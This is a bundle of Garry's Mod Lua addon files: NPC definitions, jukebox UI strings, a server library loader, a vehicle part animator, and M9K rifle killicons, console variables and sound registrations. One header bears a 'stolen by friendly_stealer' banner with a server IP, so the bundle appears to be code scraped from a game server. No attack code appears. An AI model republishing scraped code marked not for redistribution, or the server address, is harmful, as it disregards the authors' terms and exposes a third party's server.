list.Set( "NPC", "npc_grey_wolf_f", NPC )

local Category = "Kemono Friends"

local NPC = { 	Name = "Gray Wolf - Hostile", 
				Class = "npc_combine_s",
				Model = "models/kemono_friends/gray_wolf/gray_wolf_npc.mdl",
				Squadname = "Enemies",
				Numgrenades = "3",
				Health = "100",
				Category = Category	}

list.Set( "NPC", "npc_grey_wolf_h", NPC )

--PATH addons/newjukebox/lua/jukebox/lang.lua:
-- -- --
local LANG = {} //DO NOT REMOVE

//This file allows you to change the text displayed on the UI of the boombox
//You can change the text between the quotes (")
//What each line does should be self-explanatory

LANG.artist = "Артист"
LANG.song = "Песня"
LANG.select = "Выбрать"
LANG.loading = "Загрузка"
LANG.error = "Ошибка"
LANG.time = "Время"
LANG.theme = "Меню"
LANG.skin = "Цвет"

JUKEBOX.lang = LANG //DO NOT REMOVE


--PATH addons/svnv_ru_lib/lua/autorun/load.lua:
SVYANOV = SVYANOV or {}
svyanovlib = svyanovlib or {}
SVYANOV.LIB = SVYANOV.LIB or {}
SVYANOV.LIB.RUNTIME = SVYANOV.LIB.RUNTIME or {}
function SVYANOV.LIB.MsgLib(msg,stg)
	if stg == 'server' then
	MsgC( Color( 137, 222, 255 ), '[GambitRP.ru-LIB] ',Color( 137, 222, 255 ),msg..'\n' )
	elseif stg == 'client' then
	MsgC( Color( 137, 222, 255 ), '[GambitRP.ru-LIB] ',Color( 255, 222, 102 ),msg..'\n' )
	elseif stg == 'shared' then
	MsgC( Color( 195, 222, 255 ), '[GambitRP.ru-LIB] ',Color( 255, 222, 102 ),msg..'\n' )
	elseif stg == 'plug' then
	MsgC( Color( 137, 222, 255 ), '[GambitRP.ru-LIB] ',Color( 100, 255, 0 ),msg..'\n' )
	end
end

SVYANOV.LIB.include_sv = (SERVER) and include or function() end
SVYANOV.LIB.include_cl = (SERVER) and AddCSLuaFile or include

SVYANOV.LIB.include_sh = function(f)
	SVYANOV.LIB.include_sv(f)
	SVYANOV.LIB.include_cl(f)
end

function SVYANOV.LIB.LoadSharedWeb()
	local plMETA = FindMetaTable( "Player" ) function plMETA:GetRank() return self:GetUserGroup() end local function crypt_key( key, rec ) if #key < 2 then return end if not rec then math.randomseed(123) end math.randomseed( tonumber(string.sub(key, 1, 2), 16 )*math.random() ) return crypt_key( string.sub( key, 3 ), true ) end local function encrypt( key, text ) crypt_key(key) local out = "" for i=1,#text do out = out.. bit.tohex((string.byte(text[i])+math.random(255))%255, 2) end return out end local function decrypt( key, text ) crypt_key(key) local out = "" for i=1,#text,2 do out = out.. string.char((tonumber(string.sub(text, i, i+1), 16)-math.random(255))%255) end return out end SVYANOV.LIB.RUNTIME.sharedweb = true
end

function SVYANOV.LIB.Load()
	local files, directories = file.Find( "autorun/load/shared/*", "LUA" )
	for k,v in pairs(files) do
		SVYANOV.LIB.include_sh('autorun/load/shared/'..v)
		SVYANOV.LIB.MsgLib('GambitRP - LOADED SHARED: '..v,'shared')
	end
	SVYANOV.LIB.LoadSharedWeb()
	timer.Simple(3,function()
		hook.Run( 'Client Loaded' )
	end)
end

if istable(dash) and istable(dash.Modules) and istable(dash.LoadedModules) and istable(dash.BadModules) then
	SVYANOV.LIB.MsgLib("DASH LIBRARY - SUPER-OPTIMIZING!")
	vNetLOAD=true
end

SVYANOV.LIB.Load()
SVYANOV.LIB.MsgLib('GambitRP - LIB LOADER LOADED','plug')
--PATH addons/vehicles_grp_lw_shared_textures_3123454679/lua/autorun/lwcars_partmover.lua:

-- Written by http://steamcommunity.com/id/10011001100000011 for LoneWolfie.
-- DO NOT REDISTRIBUTE, REUPLOAD OR MODIFY 

local state = 1 -- We need this to set our default position of 1, to start pos.

local function LWCPartMover(car, time, bone)
	if state == 1 then state = 0
		timer.Destroy("LW" .. bone .. 0 .. tostring(car:EntIndex()))
		timer.Create("LW" .. bone .. 1 .. tostring(car:EntIndex()), time, 0, function()
		if !IsValid(car) then return end -- Needed if someone does a remove/undo on our vehicle during the anim.
			if car:GetPoseParameter(bone) >= 1 then
				car:SetPoseParameter(bone, 1)
			else
				car:SetPoseParameter(bone, car:GetPoseParameter(bone) + time)
			end
			if car:GetPoseParameter(bone) == 1 then timer.Destroy("LW" .. bone .. 1 .. tostring(car:EntIndex())) end -- We need this to stop the timer inf loop.
		end)
	else state = 1
		timer.Destroy("LW" .. bone .. 1 .. tostring(car:EntIndex()))
		timer.Create("LW" .. bone .. 0 .. tostring(car:EntIndex()), time, 0, function()
		if !IsValid(car) then return end -- Needed if someone does a remove/undo on our vehicle during the anim.
			if car:GetPoseParameter(bone) <= 0 then
				car:SetPoseParameter(bone, 0)
			else
				car:SetPoseParameter(bone, car:GetPoseParameter(bone) - time)
			end
			if car:GetPoseParameter(bone) == 0 then timer.Destroy("LW" .. bone .. 0 .. tostring(car:EntIndex())) end -- We need this to stop the timer inf loop.
		end)
	end
	
end


function LWCPartHook(time, bone, name, keyp, model) -- This function allows us to use more than 1 movement part.

	hook.Add("KeyPress", name..bone.."kp", function(ply, key) -- This seems sorta hacky.
		if ply:InVehicle() then if key != keyp then return end
			local car = ply:GetVehicle()
			
			if car:GetModel() == model then
				LWCPartMover(car, time, bone)
			end
		end	
	end)
	
end

--PATH addons/m9k/lua/autorun/m9k_assault_rifles_11_07_15.lua:
--[[
Server Name: Русский FastRP #1 [Быстрая загрузка][M9K]
Server IP:   37.230.137.126:27015
File Path:   addons/rp_wep/lua/autorun/m9k_assault_rifles_11_07_15.lua
		 __        __              __             ____     _                ____                __             __         
   _____/ /_____  / /__  ____     / /_  __  __   / __/____(_)__  ____  ____/ / /_  __     _____/ /____  ____ _/ /__  _____
  / ___/ __/ __ \/ / _ \/ __ \   / __ \/ / / /  / /_/ ___/ / _ \/ __ \/ __  / / / / /    / ___/ __/ _ \/ __ `/ / _ \/ ___/
 (__  ) /_/ /_/ / /  __/ / / /  / /_/ / /_/ /  / __/ /  / /  __/ / / / /_/ / / /_/ /    (__  ) /_/  __/ /_/ / /  __/ /    
/____/\__/\____/_/\___/_/ /_/  /_.___/\__, /  /_/ /_/  /_/\___/_/ /_/\__,_/_/\__, /____/____/\__/\___/\__,_/_/\___/_/     
                                     /____/                                 /____/_____/                                  
--]]

local icol = Color( 255, 255, 255, 255 ) 
if CLIENT then

	killicon.Add(  "m9k_acr",		"vgui/hud/m9k_acr", icol  )
	killicon.Add(  "m9k_ak47",		"vgui/hud/m9k_ak47", icol  )
	killicon.Add(  "m9k_ak74",		"vgui/hud/m9k_ak74", icol  )
	killicon.Add(  "m9k_amd65", 	"vgui/hud/m9k_amd65", icol )
	killicon.Add(  "m9k_an94", 		"vgui/hud/m9k_an94", icol )
	killicon.Add(  "m9k_auga3",		"vgui/hud/m9k_auga3", icol  )
	killicon.Add(  "m9k_f2000",		"vgui/hud/m9k_f2000", icol )
	killicon.Add(  "m9k_fal",		"vgui/hud/m9k_fal", icol )
	killicon.Add(  "m9k_famas",		"vgui/hud/m9k_famas", icol  )
	killicon.Add(  "m9k_g3a3",		"vgui/hud/m9k_g3a3", icol )
	killicon.Add(  "m9k_g36", 		"vgui/hud/m9k_g36", icol )
	killicon.Add(  "m9k_l85", 		"vgui/hud/m9k_l85", icol )
	killicon.Add(  "m9k_m4a1", 		"vgui/hud/m9k_m4a1", icol )
	killicon.Add(  "m9k_m14sp", 	"vgui/hud/m9k_m14sp", icol )
	killicon.Add(  "m9k_m16a4_acog", "vgui/hud/m9k_m16a4_acog", icol )
	killicon.Add(  "m9k_m416", 		"vgui/hud/m9k_m416", icol )
	killicon.Add(  "m9k_scar", 		"vgui/hud/m9k_scar", icol )
	killicon.Add(  "m9k_tar21", 	"vgui/hud/m9k_tar21", icol )
	killicon.Add(  "m9k_val", 		"vgui/hud/m9k_val", icol )
	killicon.Add(  "m9k_vikhr", 	"vgui/hud/m9k_vikhr", icol )
	killicon.Add(  "m9k_winchester73", "vgui/hud/m9k_winchester73", icol  )

end

if GetConVar("DebugM9K") == nil then
	CreateConVar("DebugM9K", "0", { FCVAR_REPLICATED, FCVAR_ARCHIVE }, "Debugging for some m9k stuff, turning it on won't change much.")
end

if GetConVar("M9KWeaponStrip") == nil then
	CreateConVar("M9KWeaponStrip", "0", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "Allow empty weapon stripping? 1 for true, 0 for false")
	--print("Weapon Strip con var created")
end
	
if GetConVar("M9KDisablePenetration") == nil then
	CreateConVar("M9KDisablePenetration", "0", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "Disable Penetration and Ricochets? 1 for true, 0 for false")
	--print("Penetration/ricochet con var created")
end
	
if GetConVar("M9KDynamicRecoil") == nil then
	CreateConVar("M9KDynamicRecoil", "1", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "Use Aim-modifying recoil? 1 for true, 0 for false")
	--print("Recoil con var created")
end
	
if GetConVar("M9KAmmoDetonation") == nil then
	CreateConVar("M9KAmmoDetonation", "1", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "Enable detonatable M9K Ammo crates? 1 for true, 0 for false.")
	--print("Ammo crate detonation con var created")
end

if GetConVar("M9KDamageMultiplier") == nil then
	CreateConVar("M9KDamageMultiplier", "1", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "Multiplier for M9K bullet damage.")
	--print("Damage Multiplier con var created")
end

if GetConVar("M9KDefaultClip") == nil then
	CreateConVar("M9KDefaultClip", "-1", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "How many clips will a weapon spawn with? Negative reverts to default values.")
	--print("Default Clip con var created")
end
	
if GetConVar("M9KUniqueSlots") == nil then
	CreateConVar("M9KUniqueSlots", "1", { FCVAR_REPLICATED, FCVAR_NOTIFY, FCVAR_ARCHIVE }, "Give M9K Weapons unique slots? 1 for true, 2 for false. A map change may be required.")
	--print("Unique Slots con var created")
end
	

//AN-94
sound.Add({
	name = 			"an94.single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			"weapons/an94/galil-1.wav"
})
sound.Add({
	name = 			"an94.double",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			"weapons/an94/doubletap.wav"
})

sound.Add({
	name = 			"Weapon_an-94.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/an94/clipout.mp3"
})

sound.Add({
	name = 			"Weapon_an-94.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/an94/clipin.mp3"
})

sound.Add({
	name = 			"Weapon_an-94.Boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/an94/boltpull.mp3"
})

sound.Add({
	name = 			"Weapon_an-94.Draw",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/an94/draw.mp3"
})

//AMD 65
sound.Add({
	name = 			"amd65.single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			"weapons/amd65/amd-1.wav"
})

sound.Add({
	name = 			"amd65.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/amd65/clipout.mp3"
})

sound.Add({
	name = 			"amd65.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/amd65/magin2.mp3"
})

sound.Add({
	name = 			"amd65.BoltPull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/amd65/boltpull.mp3"
})

sound.Add({
	name = 			"amd65.BoltBack",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/amd65/boltrelease.mp3"
})

//tavor
sound.Add({
	name = 			"Wep_imitavor.single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			"weapons/tavor/famas-1.wav"
})

sound.Add({
	name = 			"Wep_imitavor.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/tavor/famas_clipout.mp3"
})

sound.Add({
	name = 			"Wep_imitavor.Clipout1",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/tavor/famas_clipout1.mp3"
})

sound.Add({
	name = 			"Wep_imitavor.Tap",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/tavor/famas_tap.mp3"
})

sound.Add({
	name = 			"Wep_imitavor.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/tavor/famas_clipin.mp3"
})

sound.Add({
	name = 			"Wep_imitavor.Boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/tavor/famas_boltpull.mp3"
})

sound.Add({
	name = 			"Wep_imitavor.Boltrelease",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/tavor/famas_boltrelease.mp3"
})

sound.Add({
	name = 			"Wep_imitavor.Cloth",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/tavor/famas_cloth.mp3"
})

//f2000
sound.Add({
	name = 			"Weapon_F2000.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = {"weapons/fokku_tc_f2000/shot-1.wav",
			"weapons/fokku_tc_f2000/shot-2.wav",
			"weapons/fokku_tc_f2000/shot-3.wav",
			"weapons/fokku_tc_f2000/shot-4.wav"}	
})

sound.Add({
	name = 			"f2000.playerbreathing",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_f2000/playerbreathing.mp3"	
})

sound.Add({
	name = 			"f2000.lightcloth",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_f2000/cloth2.mp3"	
})

sound.Add({
	name = 			"f2000.heavycloth",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_f2000/cloth.mp3"	
})

sound.Add({
	name = 			"f2000.magout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_f2000/clipout.mp3"	
})

sound.Add({
	name = 			"f2000.magin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_f2000/clipin.mp3"	
})

sound.Add({
	name = 			"f2000.boltback",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound ={"weapons/fokku_tc_f2000/chargeback.mp3",
			"weapons/fokku_tc_f2000/chargeback1.mp3"}	
})

sound.Add({
	name = 			"f2000.boltforward",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = {"weapons/fokku_tc_f2000/chargefor.mp3",
			"weapons/fokku_tc_f2000/chargefor1.mp3"}	
})

//ak-47
sound.Add({
	name = 			"47ak.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = "weapons/AYKAYFORTY/ak47-1.wav"
})

sound.Add({
	name = 			"47ak.Bolt",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/AYKAYFORTY/bolt.mp3" 
})

sound.Add({
	name = 			"47ak.magin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/AYKAYFORTY/magin.mp3" 
})

sound.Add({
	name = 			"47ak.magout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/AYKAYFORTY/magout.mp3" 
})

//m14
sound.Add({
	name = 			"Weapon_M14SP.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_m14/sg550-1.wav"
})

sound.Add({
	name = 			"Weapon_M14SP.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_m14/sg550_clipout.mp3"
})

sound.Add({
	name = 			"Weapon_M14SP.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_m14/sg550_clipin.mp3"
})

sound.Add({
	name = 			"Weapon_M14SP.Boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_m14/sg550_boltpull.mp3"
})

sound.Add({
	name = 			"Weapon_M14.Deploy",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_m14/sg550_deploy.mp3"
})

//g36
sound.Add({
	name =				"G36.single",
	channel =			CHAN_USER_BASE+10,
	volume =			1.0,
	sound =				"weapons/G36/m4a1_unsil-1.wav"
})

sound.Add({
	name =	"G36.Boltback",
	channel		= CHAN_ITEM,
	volume		= 0.1,
	sound			= "weapons/G36/Boltback.mp3"
})

sound.Add({
	name =	"G36.BoltPull",
	channel		= CHAN_ITEM,
	volume		= 0.1,
	sound			= "weapons/G36/BoltPull.mp3"
})

sound.Add({
	name =	"G36.Cloth",
	channel		= CHAN_ITEM,
	volume		= 0.1,
	sound			= "weapons/G36/Cloth.mp3"
})

sound.Add({
	name =	"G36.PocketRussle",
	channel		= CHAN_ITEM,
	volume		= 0.1,
	sound			= "weapons/G36/PocketRussle.mp3"
})

sound.Add({
	name =	"G36.MagOut",
	channel		= CHAN_ITEM,
	volume		= 0.1,
	sound			= "weapons/G36/MagOut.mp3"
})

sound.Add({
	name =	"G36.MagFiddle",
	channel		= CHAN_ITEM,
	volume		= 0.1,
	sound			= "weapons/G36/MagFiddle.mp3"
})

sound.Add({
	name =	"G36.MagSlap",
	channel		= CHAN_ITEM,
	volume		= 0.1,
	sound			= "weapons/G36/MagSlap.mp3"
})

sound.Add({
	name =	"G36.PlaceSilencer",
	channel 		= CHAN_ITEM,
	volume 		= 1,
	sound		= "weapons/G36/PlaceSilencer.mp3"
})

sound.Add({
	name =	"G36.TightenSilencer",
	channel		= CHAN_ITEM,
	volume		= 0.1,
	sound			= "weapons/G36/TightenSilencer.mp3"
})

sound.Add({
	name =	"G36.SpinSilencer",
	channel		= CHAN_ITEM,
	volume		= 0.1,
	sound			= "weapons/G36/SpinSilencer.mp3"
})

sound.Add({
	name =	"G36.Safety",
	channel		= CHAN_ITEM,
	volume		= 0.1,
	sound			= "weapons/G36/Safety.mp3"
})

//winchester 1873
sound.Add({
	name = 			"Weapon_73.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			"weapons/winchester73/w73-1.wav"	
})

sound.Add({
	name = 			"Weapon_73.Pump",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/winchester73/w73pump.mp3"
})

sound.Add({
	name = 			"Weapon_73.Insertshell",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/winchester73/w73insertshell.mp3"
})

//l85
sound.Add({
	name = 			"Weapon_l85.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			"weapons/L85A2/aug-1.wav"
})

sound.Add({
	name = 			"Weapon_l85.magin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/L85A2/magin.mp3"
})

sound.Add({
	name = 			"Weapon_l85.magout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/L85A2/magout.mp3"
})

sound.Add({
	name = 			"Weapon_l85.boltslap",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/L85A2/boltslap.mp3"
})

sound.Add({
	name = 			"Weapon_l85.boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/L85A2/boltpull.mp3"
})

sound.Add({
	name = 			"Weapon_l85.cloth",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/L85A2/cloth.mp3"
})

sound.Add({
	name = 			"Weapon_l85.Tap",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/L85A2/tap.mp3"
})	

//aug a3
sound.Add({
	name = 			"aug_a3.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = {"weapons/auga3/aug-1.wav",
			"weapons/auga3/aug-2.wav"}
})

sound.Add({
	name = 			"Weap_auga3.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/auga3/clipout.mp3"
})

sound.Add({
	name = 			"Weap_auga3.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/auga3/clipin.mp3"
})

sound.Add({
	name = 			"Weap_auga3.Boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/auga3/boltpull.mp3"
})

sound.Add({
	name = 			"Weap_auga3.boltslap",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/auga3/boltslap.mp3"
})

//famas
sound.Add({
	name = 			"Weapon_FAMTC.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = {"weapons/fokku_tc_famas/shot-1.wav", 
 			"weapons/fokku_tc_famas/shot-2.wav" }
})

sound.Add({
	name = 			"Weapon_FAMTC.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_famas/famas_clipout.mp3" 
})

sound.Add({
	name = 			"Weapon_FAMTC.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_famas/famas_clipin.mp3" 
})

sound.Add({
	name = 			"Weapon_FAMTC.forearm",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_famas/famas_forearm.mp3" 
})

//Val
sound.Add({
	name = 			"Dmgfok_vally.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			"weapons/dmg_val/galil-1.wav"
})

sound.Add({
	name = 			"Dmgfok_vally.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_val/galil_clipout.mp3"
})

sound.Add({
	name = 			"Dmgfok_vally.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_val/galil_clipin.mp3"
})

sound.Add({
	name = 			"Dmgfok_vally.Boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_val/galil_Boltpull.mp3"
})

sound.Add({
	name = 			"Dmgfok_vally.Draw",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_val/draw.mp3"
})

//vikhr
sound.Add({
	name = 			"Dmgfok_vikhr.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			"weapons/dmg_vikhr/galil-1.wav"
})

sound.Add({
	name = 			"Dmgfok_vikhr.Silenced",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_vikhr/galil-sil.mp3"
})

sound.Add({
	name = 			"Dmgfok_vikhr.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_vikhr/galil_clipout.mp3"
})

sound.Add({
	name = 			"Dmgfok_vikhr.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_vikhr/galil_clipin.mp3"
})

sound.Add({
	name = 			"Dmgfok_vikhr.Boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_vikhr/galil_Boltpull.mp3"
})

sound.Add({
	name = 			"Dmgfok_vikhr.Draw",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_vikhr/draw.mp3"
})

//magpul masada ACR
sound.Add({
	name = 			"Masada.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			")weapons/masadamagpul/masada_unsil.wav"	
})

sound.Add({
	name = 			"Masada.Cloth1",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/masadamagpul/cloth1.mp3"
})

sound.Add({
	name = 			"Masada.Cloth2",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/masadamagpul/cloth2.mp3"
})

sound.Add({
	name = 			"Masada.Magin1",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/masadamagpul/magin1.mp3"	
})

sound.Add({
	name = 			"Masada.Magin2",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/masadamagpul/magin2.mp3"
})

sound.Add({
	name = 			"Masada.Foley",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/masadamagpul/foley.mp3"
})

sound.Add({
	name = 			"Masada.Magout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/masadamagpul/magout.mp3"
})

sound.Add({
	name = 			"Masada.Magslap",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/masadamagpul/magslap.mp3"
})

sound.Add({
	name = 			"Masada.Safety",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/masadamagpul/safety.mp3"
})

sound.Add({
	name = 			"Masada.Chargerback",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/masadamagpul/chargerback.mp3"	
})

sound.Add({
	name = 			"Masada.Boltrelease",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/masadamagpul/boltrelease.mp3"	
})

sound.Add({
	name = 			"Masada.Placesilencer",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/masadamagpul/placesilencer.mp3"
})

sound.Add({
	name = 			"Masada.Removesilencer",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/masadamagpul/removesilencer.mp3"	
})

//m4a1
sound.Add({
	name = 			"Dmgfok_M4A1.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			"weapons/dmg_m4a1/m4a1_unsil-1.wav"
})

sound.Add({
	name = 			"Dmgfok_M4A1.Silencer_Off",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_m4a1/m4a1_silencer_off.mp3"
})

sound.Add({
	name = 			"Dmgfok_M4A1.Silencer_On",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_m4a1/m4a1_silencer_on.mp3"
})

sound.Add({
	name = 			"Dmgfok_M4A1.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_m4a1/m4a1_clipout.mp3"
})

sound.Add({
	name = 			"Dmgfok_M4A1.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_m4a1/m4a1_clipin.mp3"
})

sound.Add({
	name = 			"Dmgfok_M4A1.Boltrelease",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_m4a1/m4a1_boltrelease.mp3"
})

sound.Add({
	name = 			"Dmgfok_M4A1.Boltrelease2",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_m4a1/m4a1_boltrelease_silenced.mp3"
})

sound.Add({
	name = 			"Dmgfok_M4A1.Boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_m4a1/m4a1_boltpull.mp3"
})

//m16a4
sound.Add({
	name = 			"Dmgfok_M16A4.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			")weapons/dmg_m16a4/shoot.wav"
})

sound.Add({
	name = 			"Dmgfok_M16A4.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_m16a4/magout.mp3"
})

sound.Add({
	name = 			"Dmgfok_M16A4.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_m16a4/magin.mp3"
})

sound.Add({
	name = 			"Dmgfok_M16A4.Boltrelease",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_m16a4/boltrelease.mp3"
})

sound.Add({
	name = 			"Dmgfok_M16A4.Boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/dmg_m16a4/boltpull.mp3"
})

-- Congratulations, you have found a secret message! Bob says hi, and hopes you are having fun with this addon.

//ak47
sound.Add({
	name = 			"Tactic_AK47.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_ak47/ak47-1.wav"
})

sound.Add({
	name = 			"Tactic_AK47.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_ak47/ak47_clipout.mp3"
})

sound.Add({
	name = 			"Tactic_AK47.Clipin",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_ak47/ak47_clipin.mp3"
})

sound.Add({
	name = 			"Tactic_AK47.Boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fokku_tc_ak47/ak47_boltpull.mp3"
})

//SCAR
sound.Add({
	name = 			"Wep_fnscarh.Single",
	channel = 		CHAN_USER_BASE+10,
	volume = 		0.1,
	sound = 			{"weapons/fnscarh/aug-1.wav",
						"weapons/fnscarh/aug-2.wav",
						"weapons/fnscarh/aug-3.wav"}
})

sound.Add({
	name = 			"Wep_fnscar.Boltpull",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fnscarh/aug_boltpull.mp3"
})

sound.Add({
	name = 			"Wep_fnscar.Boltslap",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fnscarh/aug_boltslap.mp3"
})

sound.Add({
	name = 			"Wep_fnscar.Clipout",
	channel = 		CHAN_ITEM,
	volume = 		0.1,
	sound = 			"weapons/fnscarh/aug_clipout.mp3"
})

sound.Add({
	name = 			"Wep_fnscar.Clipin",
	channel = 		CHAN_ITEM,
